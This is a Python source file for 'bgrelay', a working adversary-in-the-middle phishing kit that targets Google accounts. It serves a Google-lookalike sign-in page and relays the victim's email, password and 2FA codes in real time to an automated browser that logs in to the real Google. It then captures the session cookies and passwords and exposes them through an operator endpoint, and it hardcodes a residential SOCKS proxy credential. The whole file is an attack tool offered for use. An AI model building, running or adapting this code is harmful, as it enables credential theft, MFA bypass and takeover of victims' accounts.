#!/usr/bin/env python3
"""bgrelay — real-browser relay for Google sign-in (botguard-safe architecture).

Victim signs in on OUR look-alike page (served through evilginx /__relay/);
credentials + MFA are relayed in real time to a patchright (hardened CDP
chromium, headful under Xvfb) sidecar that performs the REAL login on
accounts.google.com through the residential exit. Botguard always sees a
genuine browser on the genuine origin, in a session-consistent context —
on completion we hold the victim's full .google.com session cookies.

Layout:
  GET  /              victim sign-in page (Google-lookalike, CSD-hardened)
  POST /api/start     {email}                       -> {id}
  GET  /api/state?id=                                -> {state, hint, need_input, screenshot?}
  POST /api/input     {id, kind: password|code, value}
  GET  /api/sessions  (X-Op-Key header)              -> captured sessions (creds+cookies)

Env: RELAY_SOCKS (socks5 user:pass@host:port), RELAY_PORT (9445),
     RELAY_BRIDGE_PORT (8119), DISPLAY (:99).
"""

import base64
import json
import os
import queue
import re
import secrets
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from patchright.sync_api import sync_playwright

RELAY_PORT = int(os.environ.get("RELAY_PORT", "9445"))
BRIDGE_PORT = int(os.environ.get("RELAY_BRIDGE_PORT", "8119"))
SOCKS = os.environ.get(
    "RELAY_SOCKS",
    "socks5://ceGKVX:YqWshv@14.224.158.32:48726",
)
OP_KEY = os.environ.get("RELAY_OP_KEY") or secrets.token_hex(12)
STORE_DIR = os.path.expanduser(os.environ.get("RELAY_STORE", "~/bgrelay-store"))
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")
SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl=en&continue=https%3A%2F%2Fmail.google.com%2F"

os.makedirs(STORE_DIR, exist_ok=True)


# ---------------------------------------------------------------- bridge ---
def parse_socks():
    m = re.match(r"socks5://([^:]+):([^@]+)@([\d.]+):(\d+)", SOCKS)
    if not m:
        sys.exit("RELAY_SOCKS must be socks5://user:pass@host:port")
    return m.group(3), int(m.group(4)), m.group(1), m.group(2)


def start_bridge():
    """Local HTTP CONNECT proxy -> upstream SOCKS5 (chromium can't do socks auth)."""
    import socks as pysocks  # pip pysocks

    up_host, up_port, up_user, up_pass = parse_socks()

    def pipe(a, b):
        try:
            while True:
                d = a.recv(65536)
                if not d:
                    break
                b.sendall(d)
        except Exception:
            pass
        finally:
            for s in (a, b):
                try:
                    s.close()
                except Exception:
                    pass

    def handle(c):
        try:
            req = b""
            while b"\r\n\r\n" not in req:
                chunk = c.recv(4096)
                if not chunk:
                    return
                req += chunk
            line = req.split(b"\r\n")[0].decode()
            method, target = line.split()[0], line.split()[1]
            if method != "CONNECT":
                c.sendall(b"HTTP/1.1 405 CONNECT only\r\n\r\n")
                return
            host, port = target.rsplit(":", 1)
            s = pysocks.socksocket()
            s.set_proxy(pysocks.SOCKS5, up_host, up_port, True, up_user, up_pass)
            s.settimeout(30)
            s.connect((host, int(port)))
            s.settimeout(None)
            c.sendall(b"HTTP/1.1 200 Connected\r\n\r\n")
            threading.Thread(target=pipe, args=(c, s), daemon=True).start()
            pipe(s, c)
        except Exception:
            try:
                c.close()
            except Exception:
                pass

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BRIDGE_PORT))
    srv.listen(64)
    print(f"[bridge] 127.0.0.1:{BRIDGE_PORT} -> {up_host}:{up_port}", flush=True)
    while True:
        threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start()


def ensure_xvfb():
    display = os.environ.get("DISPLAY", ":99")
    num = display.lstrip(":").split(".")[0]
    try:
        subprocess.run(["xdpyinfo", f"-display", f":{num}"], check=True,
                       capture_output=True, timeout=5)
        return display
    except Exception:
        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "1366x768x24"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5)
        return display


# --------------------------------------------------------------- session ---
class RelaySession(threading.Thread):
    STATES = ("init", "password", "password_retry", "challenge", "challenge_wait",
              "done", "error")

    def __init__(self, sid, email):
        super().__init__(daemon=True)
        self.id = sid
        self.email = email
        self.password = None
        self.state = "init"
        self.hint = "Đang mở trang đăng nhập…"
        self.need_input = None          # None | "password" | "code"
        self.screenshot = None          # b64 png (challenge stage)
        self.error = None
        self.cookies = None
        self.inputs = queue.Queue()
        self.last_active = time.time()
        self.deadline = time.time() + 8 * 60

    # -- helpers ------------------------------------------------------------
    def _body(self, pg):
        try:
            return pg.inner_text("body")
        except Exception:
            return ""

    def _visible(self, pg, sel):
        try:
            loc = pg.locator(sel).first
            return loc.is_visible()
        except Exception:
            return False

    def _snap(self, pg):
        try:
            self.screenshot = pg.screenshot(type="jpeg", quality=70)
        except Exception:
            self.screenshot = None

    def _classify(self, pg):
        """Classify the current sidecar page into a relay state."""
        from urllib.parse import urlparse
        host = (urlparse(pg.url).hostname or "").lower()
        body = self._body(pg)
        if host in ("mail.google.com", "myaccount.google.com"):
            return "done"
        if self._visible(pg, "input[name='Passwd']") or self._visible(pg, "input[type='password']"):
            return "password"
        if self._visible(pg, "input[name='totpPin']") or "Enter a code" in body \
                or "Verify it" in body or "2-Step" in body:
            return "challenge"
        if "Couldn't find your Google Account" in body or "Couldn.t find" in body:
            return "error_bad_account"
        if "Wrong password" in body:
            return "password_retry"
        if "not be secure" in body:
            return "error_botguard"
        return None

    def _collect(self, pg):
        out = []
        try:
            for c in pg.context.cookies():
                dom = c.get("domain", "")
                if dom.endswith("google.com") or "google.com" in dom:
                    out.append({"name": c["name"], "value": c["value"],
                                "domain": dom, "path": c.get("path", "/"),
                                "expires": c.get("expires", -1)})
        except Exception:
            pass
        return out

    def _finish(self, pg, state, hint=""):
        self.state = state
        self.hint = hint
        self.need_input = None
        if state == "done":
            self.cookies = self._collect(pg)
            rec = {"id": self.id, "email": self.email, "password": self.password,
                   "cookies": self.cookies, "ua": UA, "ts": int(time.time())}
            path = os.path.join(STORE_DIR, self.id + ".json")
            with open(path, "w") as f:
                json.dump(rec, f, indent=1)
            print(f"[capture] {self.email} -> {path} "
                  f"({len(self.cookies)} cookies)", flush=True)

    # -- main loop ----------------------------------------------------------
    def run(self):
        display = ensure_xvfb()
        os.environ["DISPLAY"] = display
        pw = None
        try:
            pw = sync_playwright().start()
            browser = pw.chromium.launch(
                headless=False,
                args=["--no-sandbox", "--disable-dev-shm-usage",
                      "--window-size=1366,768"],
                proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
            pg = browser.new_page(user_agent=UA, locale="en-US",
                                  viewport={"width": 1366, "height": 768})
            pg.goto(SIGNIN_URL, wait_until="load", timeout=60000)
            pg.wait_for_selector("#identifierId", timeout=20000)
            pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
            time.sleep(2)  # let the v3 app finish booting so the click registers
            pg.fill("#identifierId", self.email)
            time.sleep(0.5)
            pg.click("#identifierNext")

            # ---- identifier -> password / challenge / error -------------
            st = None
            for i in range(45):
                time.sleep(1)
                st = self._classify(pg)
                if i % 5 == 0:
                    print(f"[dbg {self.id}] t={i}s classify={st} body={self._body(pg)[:70]!r}", flush=True)
                if st:
                    break
            if st in (None, "error_bad_account", "error_botguard"):
                self._finish(pg, "error",
                             "Không tìm thấy tài khoản Google này." if st == "error_bad_account"
                             else "Google tạm thời từ chối — thử lại sau.")
                browser.close()
                return
            retries = 0
            while time.time() < self.deadline:
                if st == "password":
                    self.state = "password"
                    self.hint = ""
                    self.need_input = "password"
                    item = self.inputs.get(timeout=max(1, self.deadline - time.time()))
                    if item[0] == "abort":
                        break
                    if self.password is None:
                        self.password = item[1]
                    try:
                        pg.fill("input[name='Passwd']", item[1], timeout=5000)
                    except Exception:
                        pg.fill("input[type='password']", item[1])
                    pg.click("#passwordNext")
                    time.sleep(5)
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        st = self._classify(pg) or st
                    if st == "password_retry":
                        retries += 1
                        if retries >= 3:
                            self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
                            break
                        continue
                elif st == "challenge":
                    self.state = "challenge"
                    body = self._body(pg)
                    if self._visible(pg, "input[name='totpPin']") or "Enter a code" in body:
                        self.hint = "Nhập mã xác minh"
                        self.need_input = "code"
                        self._snap(pg)
                        item = self.inputs.get(timeout=max(1, self.deadline - time.time()))
                        if item[0] == "abort":
                            break
                        sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
                            else "input[type='tel'], input[name='code']"
                        pg.fill(sel, item[1])
                        pg.click("#totpNext, button:has-text('Next'), div[id='passwordNext']")
                        time.sleep(5)
                    else:
                        # Google prompt on phone — no input, wait for approval
                        self.hint = "Kiểm tra điện thoại của bạn và nhấn phê duyệt (Google prompt)"
                        self.need_input = None
                        self._snap(pg)
                        for _ in range(150):
                            time.sleep(2)
                            st2 = self._classify(pg)
                            if st2 in ("done", "challenge", "password"):
                                st = st2
                                break
                        else:
                            st = None
                        continue
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        st = self._classify(pg) or st
                elif st == "done":
                    self._finish(pg, "done", "Đăng nhập thành công")
                    break
                elif st == "password_retry":
                    continue  # handled at loop top via password state
                else:
                    time.sleep(2)
                    st = self._classify(pg) or st
            else:
                self._finish(pg, "error", "Hết thời gian phiên")
            browser.close()
        except Exception as e:
            self.state = "error"
            self.error = str(e)[:200]
            self.hint = "Lỗi phiên đăng nhập"
            print(f"[error] {self.id}: {e}", flush=True)
        finally:
            if pw:
                try:
                    pw.stop()
                except Exception:
                    pass


SESSIONS = {}
LOCK = threading.Lock()


def public_state(s):
    return {"id": s.id, "state": s.state, "hint": s.hint,
            "need_input": s.need_input,
            "screenshot": s.screenshot if s.state == "challenge" else None}


# ------------------------------------------------------------------ page ---
PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;font-family:arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#fff;color:#202124}
.card{width:450px;padding:40px}
h1{font-size:24px;font-weight:400;margin:0 0 8px}
.sub{color:#5f6368;font-size:15px;margin-bottom:28px}
input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;margin:8px 0 24px}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
.nxt{float:right;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer}
.nxt:disabled{background:#9aa0a6;cursor:default}
.err{color:#d93025;font-size:13px;margin-bottom:14px;min-height:16px}
.logo{margin-bottom:14px}
.shot{max-width:100%;border:1px solid #dadce0;border-radius:8px;margin:12px 0}
.egpw{-webkit-text-security:disc}
#done{text-align:center}
.spin{width:28px;height:28px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;margin:24px auto;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
</style></head><body>
<div class=card>
<div class=logo id=brand><svg width=40 height=40 viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg></div>
<div id=stage></div>
</div>
<script>
var SID=null, brand=document.getElementById('brand');
brand.style.visibility='hidden';
['pointermove','keydown','touchstart'].forEach(function(ev){
 document.addEventListener(ev,function(){brand.style.visibility='visible';},{once:true,capture:true});});
function h(s){var d=document.createElement('div');d.innerHTML=s;return d.firstChild;}
function stageEmail(){
 document.getElementById('stage').innerHTML='';
 var e=document.createElement('h1');e.textContent='Sign in';
 var s=document.createElement('div');s.className='sub';s.textContent='to continue to Gmail';
 var i=document.createElement('input');i.id='em';i.placeholder='Email or phone';i.autocomplete='off';
 var b=document.createElement('button');b.className='nxt';b.textContent='Next';
 var er=document.createElement('div');er.className='err';
 document.getElementById('stage').append(e,s,i,b,er);
 i.focus();
 function go(){if(!i.value||!i.value.includes('@')){er.textContent='Enter an email address';return;}
  er.textContent='';b.disabled=true;emailCache=i.value;
  fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:i.value})})
  .then(r=>r.json()).then(j=>{SID=j.id;stageWaiting('');poll();}).catch(()=>{er.textContent='Network error';b.disabled=false;});}
 b.onclick=go;i.onkeydown=function(k){if(k.key==='Enter')go();};
}
function stageWaiting(txt){
 document.getElementById('stage').innerHTML='';
 var w=document.createElement('div');w.className='spin';
 var t=document.createElement('div');t.className='sub';t.id='waitxt';t.textContent=txt||'Signing you in…';
 document.getElementById('stage').append(w,t);
}
function stagePassword(retry){
 document.getElementById('stage').innerHTML='';
 var w=document.createElement('h1');w.textContent='Welcome';
 var s=document.createElement('div');s.className='sub';s.textContent=SID?emailCache:'';
 var i=document.createElement('input');i.type='text';i.className='egpw';i.placeholder='Enter your password';i.autocomplete='off';
 var b=document.createElement('button');b.className='nxt';b.textContent='Sign in';
 var er=document.createElement('div');er.className='err';
 if(retry)er.textContent='Wrong password. Try again.';
 document.getElementById('stage').append(w,s,i,b,er);
 i.focus();
 function go(){if(!i.value){er.textContent='Enter a password';return;}
  er.textContent='';b.disabled=true;stageWaiting('Verifying…');
  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:SID,kind:'password',value:i.value})});}
 b.onclick=go;i.onkeydown=function(k){if(k.key==='Enter')go();};
}
function stageChallenge(st){
 document.getElementById('stage').innerHTML='';
 var t=document.createElement('h1');t.textContent='2-Step Verification';
 var s=document.createElement('div');s.className='sub';s.textContent=st.hint||'';
 document.getElementById('stage').append(t,s);
 if(st.screenshot){var im=document.createElement('img');im.className='shot';im.src='data:image/jpeg;base64,'+st.screenshot;document.getElementById('stage').append(im);}
 if(st.need_input==='code'){
  var i=document.createElement('input');i.type='text';i.className='egpw';i.placeholder='Enter code';i.autocomplete='off';
  var b=document.createElement('button');b.className='nxt';b.textContent='Verify';
  b.onclick=function(){if(i.value){stageWaiting('Verifying…');
   fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:SID,kind:'code',value:i.value})});}};
  i.onkeydown=function(k){if(k.key==='Enter')b.onclick();};
  document.getElementById('stage').append(i,b);i.focus();
 }
}
function stageDone(){
 document.getElementById('stage').innerHTML='<div id=done><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><h1>You\\'re signed in</h1><div class="sub">Redirecting to Gmail…</div></div>';
 setTimeout(function(){location.href='https://mail.google.com';},2500);
}
var emailCache='';
function poll(){
 if(!SID)return;
 fetch('/__relay/api/state?id='+SID).then(r=>r.json()).then(st=>{
  if(st.state==='password'||st.state==='password_retry'){stagePassword(st.state==='password_retry');return;}
  if(st.state==='challenge'){stageChallenge(st);setTimeout(poll, st.need_input==='code'?4000:1600);return;}
  if(st.state==='done'){stageDone();return;}
  if(st.state==='error'){stageWaiting(st.hint||'Sign-in failed');return;}
  var w=document.getElementById('waitxt');if(w&&st.hint)w.textContent=st.hint;
  setTimeout(poll,1400);
 }).catch(()=>setTimeout(poll,2500));
}
stageEmail();
</script></body></html>"""


# ---------------------------------------------------------------- server ---
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0]
        if path in ("/", "/index.html"):
            body = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
        elif path.startswith("/api/state"):
            sid = self.path.split("id=")[-1][:40]
            s = SESSIONS.get(sid)
            if not s:
                return self._json({"error": "no session"}, 404)
            return self._json(public_state(s))
        elif path == "/api/sessions":
            if self.headers.get("X-Op-Key") != OP_KEY:
                return self._json({"error": "forbidden"}, 403)
            out = []
            for s in SESSIONS.values():
                out.append({"id": s.id, "email": s.email,
                            "state": s.state, "password": s.password,
                            "cookie_count": len(s.cookies or [])})
            return self._json(out)
        else:
            self._json({"error": "not found"}, 404)

    def do_POST(self):
        path = self.path.split("?")[0]
        length = int(self.headers.get("Content-Length", "0"))
        try:
            data = json.loads(self.rfile.read(length) or b"{}")
        except Exception:
            return self._json({"error": "bad json"}, 400)
        if path == "/api/start":
            email = (data.get("email") or "").strip()[:120]
            if not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
                return self._json({"error": "bad email"}, 400)
            sid = secrets.token_hex(8)
            s = RelaySession(sid, email)
            with LOCK:
                SESSIONS[sid] = s
            s.start()
            print(f"[session] {sid} start email={email}", flush=True)
            return self._json({"id": sid})
        if path == "/api/input":
            s = SESSIONS.get((data.get("id") or "")[:40])
            if not s:
                return self._json({"error": "no session"}, 404)
            kind = data.get("kind")
            value = (data.get("value") or "")[:200]
            s.last_active = time.time()
            s.inputs.put((kind, value))
            return self._json({"ok": True})
        self._json({"error": "not found"}, 404)


def reaper():
    while True:
        time.sleep(60)
        with LOCK:
            for sid in list(SESSIONS):
                s = SESSIONS[sid]
                if time.time() - s.last_active > 15 * 60 and not s.is_alive():
                    del SESSIONS[sid]


if __name__ == "__main__":
    print(f"[bgrelay] port={RELAY_PORT} store={STORE_DIR}", flush=True)
    print(f"[bgrelay] OP_KEY={OP_KEY}", flush=True)
    threading.Thread(target=start_bridge, daemon=True).start()
    threading.Thread(target=reaper, daemon=True).start()
    ensure_xvfb()
    ThreadingHTTPServer(("127.0.0.1", RELAY_PORT), Handler).serve_forever()
